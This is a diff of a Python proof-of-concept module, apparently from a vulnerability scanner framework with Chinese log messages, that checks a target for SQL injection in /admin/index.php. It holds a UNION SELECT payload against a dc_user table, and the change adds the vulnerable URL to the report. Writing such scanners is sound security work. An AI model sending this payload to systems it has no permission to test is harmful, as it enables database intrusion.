@@ -47,13 +47,12 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            arg = '{target}'.format(target=self.target)
             payload = "/admin/index.php?id=-1 UNION SELECT 1,CONCAT(0x7165696a71,CAST(md5(23333) AS CHAR),0x20),3,4,5,6,7 FROM dc_user"
-            verify_url = arg + payload
+            verify_url = self.target + payload
             content = requests.get(verify_url).text
             if "qeijq0ba7bc92fcd57e337ebb9e74308c811f" in content:
-                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                    target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞;\n漏洞地址为{url}'.format(
+                    target=self.target, name=self.vuln.name,url=verify_url))
 
         except Exception as e:
             self.output.info('执行异常{}'.format(e))
